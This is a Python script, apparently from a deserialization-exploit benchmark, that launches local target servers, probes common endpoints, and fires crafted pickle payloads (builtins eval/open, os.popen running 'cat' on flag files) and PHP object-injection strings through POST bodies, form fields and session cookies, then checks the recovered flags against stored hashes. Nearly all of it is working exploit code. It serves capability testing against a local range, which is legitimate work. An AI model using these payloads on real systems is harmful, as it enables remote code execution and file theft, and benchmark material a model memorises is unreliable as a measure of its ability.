#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""反序列化利用基准 —— Python 侧独立复刻（双语言机验）。

与 Go 侧 deser_attack.go 完全独立实现：自己构造 pickle / PHP 序列化 payload，
自己发现端点、自己投递、自己抽 flag，最后与 deser_benchmark.json 里的
SHA-256 比对。两侧结论一致才算「能力真实」，而不是某一门语言的自证。

纯标准库，不依赖任何第三方包。
"""
import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "deser_range.py")
BENCH = os.path.join(HERE, "deser_benchmark.json")
PY = sys.executable

FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,20}\{[^}\s\x00-\x1f\x7f]{4,}\}")

FILES = ["flag.txt", "flag", "secret.txt", "/flag.txt", "/flag",
         "./flag.txt", "../flag.txt", "app/flag.txt"]

# 兜底常见反序列化入口（Go 侧同名清单）
COMMON_ENDPOINTS = [
    "/unpickle", "/unserialize", "/deserialize", "/deser", "/pickle",
    "/api/unpickle", "/api/deserialize", "/api/serialize", "/api/session",
    "/profile", "/session", "/load", "/import", "/obj", "/data", "/api/profile",
]

PATH_RE = re.compile(r"/[A-Za-z0-9_\-./]*\.(?:php|asp|aspx|jsp|py|html?|json|txt|action|do|cgi)\b"
                     r"|/(?:[A-Za-z0-9_\-]+/)+[A-Za-z0-9_\-]+"
                     r"|/(?:login|admin|index|cmd|fetch|page|search|profile|upload|api|xml)\b[A-Za-z0-9_\-./]*")


def sh(s):
    return hashlib.sha256(s.encode()).hexdigest()


def parse_endpoints(desc):
    """从题目描述里抽端点（题目线索优先，其后才是常见兜底路径）。"""
    out = []
    seen = set()

    def add(p):
        if p and p not in seen:
            seen.add(p)
            out.append(p)

    for m in PATH_RE.findall(desc or ""):
        add(m)
    for p in COMMON_ENDPOINTS:
        add(p)
    return out


# ---------------- payload 构造（与 Go 侧独立实现，形态一致） ----------------

def pickle_payloads(f):
    return [
        b"cbuiltins\neval\n(S\"open('" + f.encode() + b"').read()\"\ntR.",
        b"cbuiltins\nopen\n(S'" + f.encode() + b"'\ntR.",
        b"cos\npopen\n(S'cat " + f.encode() + b"'\ntR.",
    ]


def php_payloads(f):
    out = []
    for cls, prop in (("FlagReader", "path"), ("LogViewer", "file"),
                      ("FileDump", "filename"), ("Template", "log")):
        out.append('O:%d:"%s":1:{s:%d:"%s";s:%d:"%s";}'
                   % (len(cls), cls, len(prop), prop, len(f), f))
    out.append('O:10:"FlagReader":1:{s:7:"\x00*\x00path";s:%d:"%s";}' % (len(f), f))
    out.append('O:10:"FlagReader":1:{s:16:"\x00FlagReader\x00path";s:%d:"%s";}' % (len(f), f))
    return out


def scan(body):
    if not body:
        return []
    return [m.decode("utf-8", "replace") for m in FLAG_RE.findall(body)]


# ---------------- HTTP ----------------

def req(url, data=None, headers=None, timeout=6):
    r = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception:  # noqa: BLE001
        return 0, b""


def attack(base, desc, deadline):
    eps = parse_endpoints(desc)
    # 探活：404 的路径直接丢弃，避免狂发 payload
    live = []
    for ep in eps:
        if time.time() > deadline:
            break
        code, _ = req(base + ep, timeout=3)
        if code in (0, 404):
            continue
        live.append(ep)

    found = []
    for ep in live:
        if time.time() > deadline or found:
            break
        u = base + ep
        for f in FILES:
            if time.time() > deadline or found:
                break
            # 1) pickle：POST 原始字节
            for p in pickle_payloads(f):
                _, b = req(u, data=p, headers={"Content-Type": "application/octet-stream"})
                found += scan(b)
                if found:
                    break
            if found:
                break
            # 2) PHP：POST 表单 data=
            for s in php_payloads(f):
                body = urllib.parse.urlencode({"data": s}).encode()
                _, b = req(u, data=body,
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
                found += scan(b)
                if found:
                    break
            if found:
                break
            # 3) PHP：Cookie session=
            for s in php_payloads(f):
                _, b = req(u, headers={"Cookie": "session=" + urllib.parse.quote(s)})
                found += scan(b)
                if found:
                    break
    # 去重
    out, seen = [], set()
    for x in found:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def wait_ready(port, timeout=12):
    end = time.time() + timeout
    while time.time() < end:
        code, _ = req("http://127.0.0.1:%d/" % port, timeout=1)
        if code:
            return True
        time.sleep(0.1)
    return False


def main():
    if not os.path.exists(BENCH) or not os.path.exists(RANGE_PY):
        print("基准集或靶场缺失，跳过"); sys.exit(0)
    doc = json.load(open(BENCH, encoding="utf-8"))["problems"]

    port = 18141
    hit = 0
    for pid in sorted(doc):
        p = subprocess.Popen([PY, RANGE_PY, str(port), pid],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            if not wait_ready(port):
                print("  ❌ %-18s 靶场未就绪" % pid); port += 1; continue
            base = "http://127.0.0.1:%d" % port
            got = attack(base, doc[pid]["description"], time.time() + 60)
            want = doc[pid]["flag_sha256"]
            ok = any(sh(x) == want for x in got)
            print("  %s %-18s 命中=%d %s" % ("✅" if ok else "❌", pid, len(got),
                                             "SHA-256 校验通过" if ok else got[:2]))
            hit += 1 if ok else 0
        finally:
            p.kill()
            port += 1
    print("反序列化基准（Python 侧）：%d/%d" % (hit, len(doc)))
    sys.exit(0 if hit == len(doc) else 1)


if __name__ == "__main__":
    main()
